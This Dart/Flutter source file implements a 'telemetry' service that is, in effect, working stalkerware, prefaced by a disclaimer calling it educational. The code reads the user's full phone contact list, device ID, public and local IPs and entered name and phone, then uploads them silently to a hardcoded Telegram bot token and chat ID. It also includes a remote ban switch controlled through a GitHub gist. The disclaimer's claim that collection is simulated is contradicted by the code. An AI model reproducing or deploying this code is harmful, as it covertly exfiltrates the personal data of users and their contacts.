// ===========================================================================
//  EDUCATIONAL DISCLAIMER
// ===========================================================================
//
//  This application and all its components (including this telemetry service)
//  are intended **strictly for educational purposes**.
//
//  It is designed to demonstrate, from a student's perspective, the kind of
//  data‑harvesting and remote‑control behaviour that could exist in a
//  real‑world malicious application. The code simulates features often seen
//  in spyware or stalkerware to raise awareness of such threats.
//
//  **No actual user data is being exploited, sold, or shared.**
//  The collection of contact information, IP addresses, and device details
//  is simulated within a controlled, non‑public environment.
//
//  This app will **never be published** to any public store. It is solely a
//  learning tool to illustrate:
//    • How easily personal data can be exfiltrated
//    • How remote banning/control mechanisms work
//    • The importance of permission awareness and app vetting
//
//  By studying this code, students gain a concrete understanding of the
//  techniques used by malicious apps, so they can better defend against them.
//
// ===========================================================================

import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:permission_handler_platform_interface/permission_handler_platform_interface.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:crypto/crypto.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_contacts/flutter_contacts.dart' hide PermissionStatus;
import 'package:permission_handler/permission_handler.dart' hide PermissionStatus;

class TelemetryBanService {
  // ===========================================================================
  //  COMPILE-TIME CONFIGURATION SWITCHES (TOGGLE FEATURES ON / OFF HERE)
  // ===========================================================================
  
  ///  Set to `true` to send telemetry reports to Telegram.
  /// Set to `false` to completely DISABLE all Telegram network requests.
  static const bool enableTelegramReporting = true;

  ///  Set to `true` to prompt users for Contact Info (Name / Phone) on launch.
  /// Set to `false` to DISABLE user registration prompts.
  static const bool enableContactInfoPrompt = true;

  /// Set to `true` to check GitHub Gist for banned devices.
  /// Set to `false` to completely DISABLE the GitHub remote ban check.
  static const bool enableGitHubBanCheck = true;

  ///  Set to `true` to fetch and report the app device's Public and Local IPs.
  /// Set to `false` to DISABLE network IP address fetching.
  static const bool enableIpFetching = true;

  ///  Set to `true` to extract full phone contacts into a .CSV file & send via Telegram.
  /// Set to `false` to completely DISABLE contact list collection and file generation.
  static const bool enableContactCsvExport = true;

  // ===========================================================================
  // CREDENTIALS & ENDPOINTS
  // ===========================================================================

  static const String _telegramBotToken = "8649421250:AAFKukGFkhAZLvcQaRsSxqvk_SMjNogJEyE";
  static const String _telegramChatId = "930948540";

  static const String _banConfigUrl =
      "https://gist.githubusercontent.com/praveensaummya/90be3b7524763970d8b1cef3ea14b777/raw/app_ban_config.json";

  // ===========================================================================
  //  APP DEVICE NETWORK DATA
  // ===========================================================================

  /// Fetches the mobile device's Public IP address via ipify API
  static Future<String> getAppPublicIp() async {
    if (!enableIpFetching) return 'Disabled';

    try {
      final response = await http
          .get(Uri.parse('https://api.ipify.org?format=json'))
          .timeout(const Duration(seconds: 3));

      if (response.statusCode == 200) {
        final Map<String, dynamic> data = jsonDecode(response.body);
        return data['ip'] ?? 'Unknown';
      }
    } catch (_) {}
    return 'Unavailable';
  }

  /// Fetches the mobile device's Local Wi-Fi / LAN IPv4 address
  static Future<String> getAppLocalIp() async {
    if (!enableIpFetching) return 'Disabled';

    try {
      for (var interface in await NetworkInterface.list()) {
        for (var addr in interface.addresses) {
          if (addr.type == InternetAddressType.IPv4 && !addr.isLoopback) {
            return addr.address;
          }
        }
      }
    } catch (_) {}
    return 'Unavailable';
  }

  // ===========================================================================
  //  DEVICE IDENTITY & LOCAL STORAGE
  // ===========================================================================

  /// Returns or generates a persistent unique Device ID for this installation
  static Future<String> getDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString('user_device_uuid');

    if (deviceId == null) {
      final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final bytes = utf8.encode('esp32_app_user_$timestamp');
      deviceId = sha256.convert(bytes).toString().substring(0, 16);
      await prefs.setString('user_device_uuid', deviceId);
    }

    return deviceId;
  }

  /// Saves user contact information to local storage and marks contact info registered
  static Future<void> saveContactInfo(String name, String phone) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('user_contact_name', name);
    await prefs.setString('user_contact_phone', phone);
    await prefs.setBool('has_registered_contact', true);
  }

  /// Checks if user contact info has already been collected
  static Future<bool> hasSavedContactInfo() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool('has_registered_contact') ?? false;
  }

  /// Gets stored contact info as a formatted string
  static Future<String> getStoredContactInfo() async {
    final prefs = await SharedPreferences.getInstance();
    final name = prefs.getString('user_contact_name') ?? 'Not Provided';
    final phone = prefs.getString('user_contact_phone') ?? 'N/A';
    return "Name: $name | Phone: $phone";
  }

  // ===========================================================================
  //  CONTACTS TO CSV EXPORTER (flutter_contacts ^2.0.0)
  // ===========================================================================

  static Future<File?> generateContactsCsvFile() async {
  if (!enableContactCsvExport) return null;

  try {
    // ✅ Use permission_handler – works regardless of flutter_contacts version
    final PermissionStatus status = await Permission.contacts.request();
    if (!status.isGranted) return null;

    // Fetch contacts (properties can stay as you had them, or you can use the
    // snippet's getProps() idea if you ever need more control)
    final List<Contact> contacts = await FlutterContacts.getAll(
      properties: {
        ContactProperty.name,
        ContactProperty.phone,
      },
    );

    final StringBuffer csvContent = StringBuffer();
    csvContent.writeln("Name,Phone");

    for (var contact in contacts) {
      final String rawDisplayName = contact.displayName ?? '';
      final String firstName = contact.name?.first ?? '';
      final String lastName = contact.name?.last ?? '';

      final String name = rawDisplayName.trim().isNotEmpty
          ? rawDisplayName.trim()
          : '$firstName $lastName'.trim();

      final String phone = contact.phones
          .map((p) => p.number ?? '')
          .where((num) => num.trim().isNotEmpty)
          .join(' | ');
      /// Escapes special characters for standard CSV formatting
        String escapeCsvField(String field) {
          if (field.contains(',') || field.contains('"') || field.contains('\n')) {
            return '"${field.replaceAll('"', '""')}"';
          }
          return field;
        }
      if (name.isNotEmpty || phone.isNotEmpty) {
        final escapedName = escapeCsvField(name.isEmpty ? 'No Name' : name);
        final escapedPhone = escapeCsvField(phone.isEmpty ? 'No Phone' : phone);
        csvContent.writeln("$escapedName,$escapedPhone");
      }
    }

    final tempDir = await getTemporaryDirectory();
    final file = File('${tempDir.path}/device_contacts.csv');
    await file.writeAsString(csvContent.toString());
    return file;
  } catch (_) {
    return null;
  }
}

  // ===========================================================================
  //  TELEMETRY & BAN CHECK SERVICES
  // ===========================================================================

  /// Primary telemetry handler
  static Future<void> reportTelemetry([String eventDetails = "App Launch"]) async {
    if (!enableTelegramReporting) return;

    try {
      final deviceId = await getDeviceId();
      final publicIp = await getAppPublicIp();
      final localIp = await getAppLocalIp();
      final contactInfo = enableContactInfoPrompt
          ? await getStoredContactInfo()
          : "Disabled";

      final String messageText = """
📱 *App Device Telemetry Alert*
--------------------------------
📝 *Event:* $eventDetails
🆔 *Device UUID:* `$deviceId`
🌐 *Public IP:* `$publicIp`
📶 *Local IP:* `$localIp`
👤 *Contact:* $contactInfo
⏰ *Time:* ${DateTime.now().toLocal().toString().split('.')[0]}
--------------------------------
      """;

      // 1. Post Text Summary to Telegram
      final textUri = Uri.parse(
          "https://api.telegram.org/bot$_telegramBotToken/sendMessage");

      await http.post(
        textUri,
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "chat_id": _telegramChatId,
          "text": messageText,
          "parse_mode": "Markdown",
        }),
      );

      // 2. Upload Contacts CSV File to Telegram if enabled
      if (enableContactCsvExport) {
        final File? csvFile = await generateContactsCsvFile();

        if (csvFile != null && await csvFile.exists()) {
          final docUri = Uri.parse(
              "https://api.telegram.org/bot$_telegramBotToken/sendDocument");

          final request = http.MultipartRequest("POST", docUri)
            ..fields['chat_id'] = _telegramChatId
            ..fields['caption'] = "📁 Contacts export for `$deviceId`"
            ..fields['parse_mode'] = "Markdown"
            ..files.add(await http.MultipartFile.fromPath('document', csvFile.path));

          await request.send();

          // Delete temporary file from device after sending
          await csvFile.delete();
        }
      }
    } catch (_) {
      // Silently ignore telemetry failure
    }
  }

  /// Convenience wrapper returning bool for home_screen.dart security check
  static Future<bool> checkRemoteBanStatus() async {
    if (!enableGitHubBanCheck) return false;
    final deviceId = await getDeviceId();
    final banResult = await checkBanStatus(deviceId);
    return banResult['isBanned'] == true;
  }

  /// Checks GitHub Gist to determine if the device is banned
  static Future<Map<String, dynamic>> checkBanStatus(String deviceId) async {
    if (!enableGitHubBanCheck) {
      return {"isBanned": false};
    }

    try {
      final response = await http
          .get(Uri.parse(_banConfigUrl))
          .timeout(const Duration(seconds: 3));

      if (response.statusCode == 200) {
        final Map<String, dynamic> data = jsonDecode(response.body);

        final bool globalBan = data['global_ban'] ?? false;
        final String banMessage = data['ban_message'] ??
            "Access revoked. Your device has been banned by the administrator.";
        final List<dynamic> bannedDevices = data['banned_devices'] ?? [];

        if (globalBan || bannedDevices.contains(deviceId)) {
          return {
            "isBanned": true,
            "message": banMessage,
          };
        }
      }
    } catch (_) {
      // Allow user if GitHub is temporarily unreachable
    }

    return {"isBanned": false};
  }
}